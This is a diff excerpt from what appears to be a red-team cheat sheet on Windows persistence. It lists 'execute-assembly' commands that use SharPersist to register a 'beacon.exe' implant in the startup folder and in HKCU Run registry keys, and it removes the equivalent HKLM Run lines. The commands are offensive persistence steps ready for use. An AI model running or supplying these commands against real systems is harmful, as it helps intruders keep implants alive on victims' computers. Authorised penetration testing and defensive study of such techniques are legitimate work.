@@ -31,10 +31,6 @@ execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
 execute-assembly /root/SharPersist.exe -t reg -c "C:\users\public\beacon.exe" -k "hkcurun" -v "Name" -m add
 execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -v "Name" -m remove
 execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -m list
-
-execute-assembly /root/SharPersist.exe -t reg -c "C:\users\public\beacon.exe" -k "hklmrun" -v "Name" -m add
-execute-assembly /root/SharPersist.exe -t reg -k "hklmrun" -v "Name" -m remove
-execute-assembly /root/SharPersist.exe -t reg -k "hklmrun" -m list
 ```
 
 ### Windows Service (Admin Access)
